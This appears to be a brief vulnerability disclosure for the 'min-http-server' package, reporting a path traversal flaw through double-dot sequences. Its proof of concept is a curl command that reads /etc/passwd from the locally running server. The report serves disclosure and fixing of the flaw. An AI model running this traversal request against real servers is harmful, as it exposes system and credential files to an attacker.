# Description

The `min-http-server` package is vulnerable against `path traversal`, which leads to `information disclosure` and `sensitive file leakage`.
The package is vulnerable against this attack through the `double dots` technique.

# PoC

1. Download `min-http-server`
2. `./min-http-server`
3. Run 

```bash
curl --path-as-is 'http://localhost:1579/../../../../../../../etc/passwd'
```
4. The content of `/etc/passwd` is shown :smile:
